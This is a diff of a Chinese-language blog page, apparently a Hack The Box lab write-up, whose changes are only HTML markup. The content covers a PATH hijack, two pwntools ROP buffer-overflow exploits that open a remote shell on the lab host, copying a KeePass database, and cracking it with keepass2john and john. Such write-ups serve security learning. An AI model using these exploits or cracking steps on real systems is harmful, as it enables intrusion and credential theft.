 <p>如上，可知道<code>/usr/local/bin</code>为PATH的一个路径，而10-uname文件为执行<code>uname</code>命令。一个思路：<strong>在可写的路径下放置一个我们设置好的uname文件</strong></p>
-<p><img src="/2022/11/27/WP-HTB-Password-Cracking/image-20221213013454441.png" alt="image-20221213013454441"></p>
+<p><img src="/2022/11/27/WP-HTB-Password-Cracking/image-20221213013454441.png" srcset="/img/loading.gif" lazyload alt="image-20221213013454441"></p>
 <p>搞定</p>
-<p><img src="/2022/11/27/WP-HTB-Password-Cracking/image-20221213014244847.png" alt="image-20221213014244847"></p>
+<p><img src="/2022/11/27/WP-HTB-Password-Cracking/image-20221213014244847.png" srcset="/img/loading.gif" lazyload alt="image-20221213014244847"></p>
 <h3 id="总结-1"><a href="#总结-1" class="headerlink" title="总结"></a>总结</h3><p>从官方的报告中，一些提升点</p>
 <ul>
 <li>使用<code>Burpsuite</code>功能：Send to spider进行目标网站抓取</li>
 <li>wappalyzer：识别CMS</li>
 </ul>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">apt install npm</span><br><span class="line">npm -i -g wappalyzer</span><br><span class="line"><span class="comment"># jq进行命令行json解析</span></span><br><span class="line">wappalyzer url|jq</span><br></pre></td></tr></table></figure>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">apt install npm<br>npm -i -g wappalyzer<br><span class="hljs-comment"># jq进行命令行json解析</span><br>wappalyzer url|jq<br></code></pre></td></tr></table></figure>
 
 <ul>
 <li>反弹shell</li>
@@ -275,29 +429,29 @@
 <li>chmod a+x</li>
 </ul>
 <h2 id="Safe"><a href="#Safe" class="headerlink" title="Safe"></a>Safe</h2><p>偏二进制的靶机</p>
-<h3 id="Nmap-2"><a href="#Nmap-2" class="headerlink" title="Nmap"></a>Nmap</h3><p><img src="/2022/11/27/WP-HTB-Password-Cracking/image-20221217123714574.png" alt="image-20221217123714574"></p>
+<h3 id="Nmap-2"><a href="#Nmap-2" class="headerlink" title="Nmap"></a>Nmap</h3><p><img src="/2022/11/27/WP-HTB-Password-Cracking/image-20221217123714574.png" srcset="/img/loading.gif" lazyload alt="image-20221217123714574"></p>
 <p>访问80端口（一般可以先看看源码或看看robots.txt）</p>
-<p><img src="/2022/11/27/WP-HTB-Password-Cracking/image-20221217130250567.png" alt="image-20221217130250567"></p>
+<p><img src="/2022/11/27/WP-HTB-Password-Cracking/image-20221217130250567.png" srcset="/img/loading.gif" lazyload alt="image-20221217130250567"></p>
 <p>1337端口运行了一个myapp的程序</p>
-<h3 id="1337"><a href="#1337" class="headerlink" title="1337"></a>1337</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">┌──(tiger㉿kali)-[~/桌面/hack-the-box/safe]</span><br><span class="line">└─$ wget http://10.10.10.147/myapp                                             </span><br><span class="line">--2022-12-17 13:04:28--  http://10.10.10.147/myapp</span><br><span class="line">正在连接 10.10.10.147:80... 已连接。</span><br><span class="line">已发出 HTTP 请求，正在等待回应... 200 OK</span><br><span class="line">长度：16592 (16K)</span><br><span class="line">正在保存至: “myapp”</span><br><span class="line"></span><br><span class="line">myapp                            100%[=========================================================&gt;]  16.20K  69.9KB/s  用时 0.2s    </span><br><span class="line"></span><br><span class="line">2022-12-17 13:04:28 (69.9 KB/s) - 已保存 “myapp” [16592/16592])</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<h3 id="1337"><a href="#1337" class="headerlink" title="1337"></a>1337</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(tiger㉿kali)-[~/桌面/hack-the-box/safe]<br>└─$ wget http://10.10.10.147/myapp                                             <br>--2022-12-17 13:04:28--  http://10.10.10.147/myapp<br>正在连接 10.10.10.147:80... 已连接。<br>已发出 HTTP 请求，正在等待回应... 200 OK<br>长度：16592 (16K)<br>正在保存至: “myapp”<br><br>myapp                            100%[=========================================================&gt;]  16.20K  69.9KB/s  用时 0.2s    <br><br>2022-12-17 13:04:28 (69.9 KB/s) - 已保存 “myapp” [16592/16592])<br><br></code></pre></td></tr></table></figure>
 
 <p>初步执行来看，是可以进行溢出的</p>
-<p><img src="/2022/11/27/WP-HTB-Password-Cracking/image-20221217131259457.png" alt="image-20221217131259457"></p>
+<p><img src="/2022/11/27/WP-HTB-Password-Cracking/image-20221217131259457.png" srcset="/img/loading.gif" lazyload alt="image-20221217131259457"></p>
 <p>IDA分析</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> s[<span class="number">112</span>]; <span class="comment">// [rsp+0h] [rbp-70h] BYREF</span></span><br><span class="line"></span><br><span class="line">  system(<span class="string">&quot;/usr/bin/uptime&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;\nWhat do you want me to echo back? &quot;</span>);</span><br><span class="line">  gets(s, <span class="number">1000LL</span>);</span><br><span class="line">  <span class="built_in">puts</span>(s);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> __cdecl <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">const</span> <span class="hljs-type">char</span> **argv, <span class="hljs-type">const</span> <span class="hljs-type">char</span> **envp)</span><br>&#123;<br>  <span class="hljs-type">char</span> s[<span class="hljs-number">112</span>]; <span class="hljs-comment">// [rsp+0h] [rbp-70h] BYREF</span><br><br>  system(<span class="hljs-string">&quot;/usr/bin/uptime&quot;</span>);<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\nWhat do you want me to echo back? &quot;</span>);<br>  gets(s, <span class="hljs-number">1000LL</span>);<br>  <span class="hljs-built_in">puts</span>(s);<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure>
 
 <p>利用<code>gets</code>函数进行溢出</p>
 <p>解法一：利用函数test进行跳转</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&quot;./myapp&quot;</span>)</span><br><span class="line">rop = ROP(elf)</span><br><span class="line"></span><br><span class="line">POP_R13_R14_R15 = (rop.find_gadget([<span class="string">&#x27;pop r13&#x27;</span>, <span class="string">&#x27;pop r14&#x27;</span>, <span class="string">&#x27;pop r15&#x27;</span>,</span><br><span class="line">                                    <span class="string">&#x27;ret&#x27;</span>]))[<span class="number">0</span>]</span><br><span class="line">TEST = elf.symbols[<span class="string">&#x27;test&#x27;</span>]</span><br><span class="line">SYSTEM = elf.plt[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&quot;A&quot;</span> * <span class="number">112</span></span><br><span class="line">payload += <span class="string">b&quot;/bin/sh\x00&quot;</span></span><br><span class="line">payload += p64(POP_R13_R14_R15)</span><br><span class="line">payload += p64(SYSTEM)</span><br><span class="line">payload += <span class="string">b&quot;A&quot;</span> * <span class="number">16</span></span><br><span class="line">payload += p64(TEST)</span><br><span class="line"></span><br><span class="line">log.info(<span class="string">&quot;pop r13, r14, r15 gadget: &quot;</span> + <span class="built_in">hex</span>(POP_R13_R14_R15))</span><br><span class="line">log.info(<span class="string">&quot;test: &quot;</span> + <span class="built_in">hex</span>(TEST))</span><br><span class="line">log.info(<span class="string">&quot;system: &quot;</span> + <span class="built_in">hex</span>(SYSTEM))</span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&quot;10.10.10.147&quot;</span>, <span class="number">1337</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"><span class="comment"># p.sendline(&quot;\n&quot;)</span></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>elf = ELF(<span class="hljs-string">&quot;./myapp&quot;</span>)<br>rop = ROP(elf)<br><br>POP_R13_R14_R15 = (rop.find_gadget([<span class="hljs-string">&#x27;pop r13&#x27;</span>, <span class="hljs-string">&#x27;pop r14&#x27;</span>, <span class="hljs-string">&#x27;pop r15&#x27;</span>,<br>                                    <span class="hljs-string">&#x27;ret&#x27;</span>]))[<span class="hljs-number">0</span>]<br>TEST = elf.symbols[<span class="hljs-string">&#x27;test&#x27;</span>]<br>SYSTEM = elf.plt[<span class="hljs-string">&#x27;system&#x27;</span>]<br><br>payload = <span class="hljs-string">b&quot;A&quot;</span> * <span class="hljs-number">112</span><br>payload += <span class="hljs-string">b&quot;/bin/sh\x00&quot;</span><br>payload += p64(POP_R13_R14_R15)<br>payload += p64(SYSTEM)<br>payload += <span class="hljs-string">b&quot;A&quot;</span> * <span class="hljs-number">16</span><br>payload += p64(TEST)<br><br>log.info(<span class="hljs-string">&quot;pop r13, r14, r15 gadget: &quot;</span> + <span class="hljs-built_in">hex</span>(POP_R13_R14_R15))<br>log.info(<span class="hljs-string">&quot;test: &quot;</span> + <span class="hljs-built_in">hex</span>(TEST))<br>log.info(<span class="hljs-string">&quot;system: &quot;</span> + <span class="hljs-built_in">hex</span>(SYSTEM))<br><br>p = remote(<span class="hljs-string">&quot;10.10.10.147&quot;</span>, <span class="hljs-number">1337</span>)<br>p.sendline(payload)<br><span class="hljs-comment"># p.sendline(&quot;\n&quot;)</span><br>p.interactive()<br></code></pre></td></tr></table></figure>
 
 <p>解法二：利用gets函数写data段</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&quot;./myapp&quot;</span>)</span><br><span class="line">rop = ROP(elf)</span><br><span class="line"></span><br><span class="line">pop_rdi = (rop.find_gadget([<span class="string">&#x27;pop rdi&#x27;</span>, <span class="string">&#x27;ret&#x27;</span>]))[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line">system_addr = elf.plt[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">gets_addr = elf.plt[<span class="string">&#x27;gets&#x27;</span>]</span><br><span class="line"><span class="comment"># write to data</span></span><br><span class="line">binsh_addr = <span class="number">0x404038</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&quot;A&quot;</span> * <span class="number">120</span></span><br><span class="line">payload += p64(pop_rdi)</span><br><span class="line">payload += p64(binsh_addr)</span><br><span class="line">payload += p64(gets_addr)</span><br><span class="line">payload += p64(pop_rdi)</span><br><span class="line">payload += p64(binsh_addr)</span><br><span class="line">payload += p64(system_addr)</span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&quot;10.10.10.147&quot;</span>, <span class="number">1337</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"><span class="comment"># p.sendline(&quot;\n&quot;)</span></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>elf = ELF(<span class="hljs-string">&quot;./myapp&quot;</span>)<br>rop = ROP(elf)<br><br>pop_rdi = (rop.find_gadget([<span class="hljs-string">&#x27;pop rdi&#x27;</span>, <span class="hljs-string">&#x27;ret&#x27;</span>]))[<span class="hljs-number">0</span>]<br><br>system_addr = elf.plt[<span class="hljs-string">&#x27;system&#x27;</span>]<br>gets_addr = elf.plt[<span class="hljs-string">&#x27;gets&#x27;</span>]<br><span class="hljs-comment"># write to data</span><br>binsh_addr = <span class="hljs-number">0x404038</span><br><br>payload = <span class="hljs-string">b&quot;A&quot;</span> * <span class="hljs-number">120</span><br>payload += p64(pop_rdi)<br>payload += p64(binsh_addr)<br>payload += p64(gets_addr)<br>payload += p64(pop_rdi)<br>payload += p64(binsh_addr)<br>payload += p64(system_addr)<br><br>p = remote(<span class="hljs-string">&quot;10.10.10.147&quot;</span>, <span class="hljs-number">1337</span>)<br>p.sendline(payload)<br><span class="hljs-comment"># p.sendline(&quot;\n&quot;)</span><br>p.interactive()<br></code></pre></td></tr></table></figure>
 
 <h3 id="提权-2"><a href="#提权-2" class="headerlink" title="提权"></a>提权</h3><p>查看目录</p>
-<p><img src="/2022/11/27/WP-HTB-Password-Cracking/image-20221219004005149.png" alt="image-20221219004005149"></p>
+<p><img src="/2022/11/27/WP-HTB-Password-Cracking/image-20221219004005149.png" srcset="/img/loading.gif" lazyload alt="image-20221219004005149"></p>
 <p>有几张图片和一个密码数据库，尝试拷贝下来。添加公钥到<code> authorized_keys</code></p>
-<p><img src="/2022/11/27/WP-HTB-Password-Cracking/image-20221219005719689.png" alt="image-20221219005719689"></p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">┌──(tiger㉿kali)-[~/桌面/hack-the-box/safe]</span><br><span class="line">└─$ scp -r user@10.10.10.147:/home/user/ ./</span><br><span class="line">The authenticity of host <span class="string">&#x27;10.10.10.147 (10.10.10.147)&#x27;</span> can<span class="string">&#x27;t be established.</span></span><br><span class="line"><span class="string">ED25519 key fingerprint is SHA256:Hqxg+VODVEXsVQmThoXvZx82QI/LgQDGT59rQLHOaDQ.</span></span><br><span class="line"><span class="string">This key is not known by any other names</span></span><br><span class="line"><span class="string">Are you sure you want to continue connecting (yes/no/[fingerprint])? yes</span></span><br><span class="line"><span class="string">Warning: Permanently added &#x27;</span>10.10.10.147<span class="string">&#x27; (ED25519) to the list of known hosts.</span></span><br><span class="line"><span class="string">IMG_0547.JPG                                                                                                                                        100% 2470KB 906.9KB/s   00:02    </span></span><br><span class="line"><span class="string">IMG_0545.JPG                                                                                                                                        100% 1863KB 150.1KB/s   00:12    </span></span><br><span class="line"><span class="string">IMG_0548.JPG                                                                                                                                        100% 2858KB   1.2MB/s   00:02    </span></span><br><span class="line"><span class="string">myapp                                                                                                                                               100%   16KB  77.7KB/s   00:00    </span></span><br><span class="line"><span class="string">authorized_keys                                                                                                                                     100%  564     3.2KB/s   00:00    </span></span><br><span class="line"><span class="string">MyPasswords.kdbx                                                                                                                                    100% 2446    11.7KB/s   00:00    </span></span><br><span class="line"><span class="string">scp: download /home/user/.bash_history: not a regular file</span></span><br><span class="line"><span class="string">scp: Download of file /home/user/.bash_history to ./user/.bash_history failed</span></span><br><span class="line"><span class="string">.bashrc                                                                                                                                             100% 3526    16.9KB/s   00:00    </span></span><br><span class="line"><span class="string">.bash_logout                                                                                                                                        100%  220     1.2KB/s   00:00    </span></span><br><span class="line"><span class="string">IMG_0552.JPG                                                                                                                                        100% 1099KB 918.2KB/s   00:01    </span></span><br><span class="line"><span class="string">.profile                                                                                                                                            100%  675     3.9KB/s   00:00    </span></span><br><span class="line"><span class="string">IMG_0546.JPG                                                                                                                                        100% 1872KB   1.1MB/s   00:01    </span></span><br><span class="line"><span class="string">IMG_0553.JPG                                                                                                                                        100% 1060KB 708.6KB/s   00:01    </span></span><br><span class="line"><span class="string">user.txt    </span></span><br></pre></td></tr></table></figure>
+<p><img src="/2022/11/27/WP-HTB-Password-Cracking/image-20221219005719689.png" srcset="/img/loading.gif" lazyload alt="image-20221219005719689"></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(tiger㉿kali)-[~/桌面/hack-the-box/safe]<br>└─$ scp -r user@10.10.10.147:/home/user/ ./<br>The authenticity of host <span class="hljs-string">&#x27;10.10.10.147 (10.10.10.147)&#x27;</span> can<span class="hljs-string">&#x27;t be established.</span><br><span class="hljs-string">ED25519 key fingerprint is SHA256:Hqxg+VODVEXsVQmThoXvZx82QI/LgQDGT59rQLHOaDQ.</span><br><span class="hljs-string">This key is not known by any other names</span><br><span class="hljs-string">Are you sure you want to continue connecting (yes/no/[fingerprint])? yes</span><br><span class="hljs-string">Warning: Permanently added &#x27;</span>10.10.10.147<span class="hljs-string">&#x27; (ED25519) to the list of known hosts.</span><br><span class="hljs-string">IMG_0547.JPG                                                                                                                                        100% 2470KB 906.9KB/s   00:02    </span><br><span class="hljs-string">IMG_0545.JPG                                                                                                                                        100% 1863KB 150.1KB/s   00:12    </span><br><span class="hljs-string">IMG_0548.JPG                                                                                                                                        100% 2858KB   1.2MB/s   00:02    </span><br><span class="hljs-string">myapp                                                                                                                                               100%   16KB  77.7KB/s   00:00    </span><br><span class="hljs-string">authorized_keys                                                                                                                                     100%  564     3.2KB/s   00:00    </span><br><span class="hljs-string">MyPasswords.kdbx                                                                                                                                    100% 2446    11.7KB/s   00:00    </span><br><span class="hljs-string">scp: download /home/user/.bash_history: not a regular file</span><br><span class="hljs-string">scp: Download of file /home/user/.bash_history to ./user/.bash_history failed</span><br><span class="hljs-string">.bashrc                                                                                                                                             100% 3526    16.9KB/s   00:00    </span><br><span class="hljs-string">.bash_logout                                                                                                                                        100%  220     1.2KB/s   00:00    </span><br><span class="hljs-string">IMG_0552.JPG                                                                                                                                        100% 1099KB 918.2KB/s   00:01    </span><br><span class="hljs-string">.profile                                                                                                                                            100%  675     3.9KB/s   00:00    </span><br><span class="hljs-string">IMG_0546.JPG                                                                                                                                        100% 1872KB   1.1MB/s   00:01    </span><br><span class="hljs-string">IMG_0553.JPG                                                                                                                                        100% 1060KB 708.6KB/s   00:01    </span><br><span class="hljs-string">user.txt    </span><br></code></pre></td></tr></table></figure>
 
 <p>KDBX文件</p>
 <p><a target="_blank" rel="noopener" href="https://www.keepass.com.cn/features">https://www.keepass.com.cn/features</a></p>
@@ -310,15 +464,15 @@
 <p><strong>When using both password *and* key file, the final key is derived as follows: SHA-256(SHA-256(password), key file contents), i.e. the hash of the master password is concatenated with the key file bytes and the resulting byte string is hashed with SHA-256 again</strong>. If the key file doesn’t contain exactly 32 bytes (256 bits), they are hashed with SHA-256, too, to form a 256-bit key. The formula above then changes to: SHA-256(SHA-256(password), SHA-256(key file contents)).</p>
 </blockquote>
 <p>从Key的生成方式可以看到，在拥有keyfile的情况下，可以得到<code>sha-256(password)</code></p>
-<p><img src="/2022/11/27/WP-HTB-Password-Cracking/image-20221219025453812.png" alt="image-20221219025453812"></p>
+<p><img src="/2022/11/27/WP-HTB-Password-Cracking/image-20221219025453812.png" srcset="/img/loading.gif" lazyload alt="image-20221219025453812"></p>
 <p><strong>kpass2john</strong></p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> *.JPG</span><br><span class="line"><span class="keyword">do</span></span><br><span class="line">        keepass2john -k <span class="variable">$i</span> MyPasswords.kdbx &gt;&gt; hashes</span><br><span class="line"><span class="keyword">done</span></span><br></pre></td></tr></table></figure>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-meta">#!/bin/bash</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> *.JPG<br><span class="hljs-keyword">do</span><br>        keepass2john -k <span class="hljs-variable">$i</span> MyPasswords.kdbx &gt;&gt; hashes<br><span class="hljs-keyword">done</span><br></code></pre></td></tr></table></figure>
 
 <p>john破解</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">┌──(tiger㉿kali)-[~/桌面/hack-the-box/safe/user]</span><br><span class="line">└─$ john --fork=4 --wordlist=../../rockyou.txt hashes </span><br><span class="line">Using default input encoding: UTF-8</span><br><span class="line">Loaded 6 password hashes with 6 different salts (KeePass [SHA256 AES 32/64])</span><br><span class="line">Cost 1 (iteration count) is 60000 <span class="keyword">for</span> all loaded hashes</span><br><span class="line">Cost 2 (version) is 2 <span class="keyword">for</span> all loaded hashes</span><br><span class="line">Cost 3 (algorithm [0=AES 1=TwoFish 2=ChaCha]) is 0 <span class="keyword">for</span> all loaded hashes</span><br><span class="line">Node numbers 1-4 of 4 (fork)</span><br><span class="line">Press <span class="string">&#x27;q&#x27;</span> or Ctrl-C to abort, almost any other key <span class="keyword">for</span> status</span><br><span class="line">bullshit         (MyPasswords)     </span><br><span class="line">2 0g 0:00:00:57 0.01% (ETA: 2022-12-29 04:34) 0g/s 5.117p/s 30.73c/s 30.73C/s sarita</span><br><span class="line">3 0g 0:00:00:57 0.01% (ETA: 2022-12-28 06:06) 0g/s 5.613p/s 33.71c/s 33.71C/s 171717</span><br><span class="line">4 0g 0:00:00:57 0.01% (ETA: 2022-12-29 00:42) 0g/s 5.171p/s 31.04c/s 31.04C/s 1q2w3e</span><br><span class="line">1 1g 0:00:00:57 0.01% (ETA: 2022-12-28 07:04) 0.01734g/s 5.585p/s 32.31c/s 32.31C/s peanut1</span><br><span class="line">Waiting <span class="keyword">for</span> 3 children to terminate</span><br><span class="line">Use the <span class="string">&quot;--show&quot;</span> option to display all of the cracked passwords reliably</span><br><span class="line">Session aborted</span><br></pre></td></tr></table></figure>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(tiger㉿kali)-[~/桌面/hack-the-box/safe/user]<br>└─$ john --fork=4 --wordlist=../../rockyou.txt hashes <br>Using default input encoding: UTF-8<br>Loaded 6 password hashes with 6 different salts (KeePass [SHA256 AES 32/64])<br>Cost 1 (iteration count) is 60000 <span class="hljs-keyword">for</span> all loaded hashes<br>Cost 2 (version) is 2 <span class="hljs-keyword">for</span> all loaded hashes<br>Cost 3 (algorithm [0=AES 1=TwoFish 2=ChaCha]) is 0 <span class="hljs-keyword">for</span> all loaded hashes<br>Node numbers 1-4 of 4 (fork)<br>Press <span class="hljs-string">&#x27;q&#x27;</span> or Ctrl-C to abort, almost any other key <span class="hljs-keyword">for</span> status<br>bullshit         (MyPasswords)     <br>2 0g 0:00:00:57 0.01% (ETA: 2022-12-29 04:34) 0g/s 5.117p/s 30.73c/s 30.73C/s sarita<br>3 0g 0:00:00:57 0.01% (ETA: 2022-12-28 06:06) 0g/s 5.613p/s 33.71c/s 33.71C/s 171717<br>4 0g 0:00:00:57 0.01% (ETA: 2022-12-29 00:42) 0g/s 5.171p/s 31.04c/s 31.04C/s 1q2w3e<br>1 1g 0:00:00:57 0.01% (ETA: 2022-12-28 07:04) 0.01734g/s 5.585p/s 32.31c/s 32.31C/s peanut1<br>Waiting <span class="hljs-keyword">for</span> 3 children to terminate<br>Use the <span class="hljs-string">&quot;--show&quot;</span> option to display all of the cracked passwords reliably<br>Session aborted<br></code></pre></td></tr></table></figure>
 
 <p>使用<code>kpcli</code>进行文件查看</p>
-<p><img src="/2022/11/27/WP-HTB-Password-Cracking/image-20221219030525056.png" alt="image-20221219030525056"></p>
+<p><img src="/2022/11/27/WP-HTB-Password-Cracking/image-20221219030525056.png" srcset="/img/loading.gif" lazyload alt="image-20221219030525056"></p>
 <h2 id="fs0ciety"><a href="#fs0ciety" class="headerlink" title="fs0ciety"></a>fs0ciety</h2><blockquote>
 <p>CHALLENGE DESCRIPTION</p>
 <p>We believe that there is an SSH Password inside password protected ‘ZIP’ folder. Can you crack the ‘ZIP’ folder and get the SSH password?</p>
@@ -327,64 +481,64 @@
 <h3 id="总结-2"><a href="#总结-2" class="headerlink" title="总结"></a>总结</h3><p>许多writeup使用<code>fcrackzip</code>来完成对zip密码的破解</p>
 <p><a target="_blank" rel="noopener" href="https://sequr.be/blog/2019/08/fs0ciety/">https://sequr.be/blog/2019/08/fs0ciety/</a></p>
 <p><a target="_blank" rel="noopener" href="https://medium.com/@yashnavadiya/htb-fs0ciety-easy-misc-challenge-50f8edd0fffd">https://medium.com/@yashnavadiya/htb-fs0ciety-easy-misc-challenge-50f8edd0fffd</a></p>
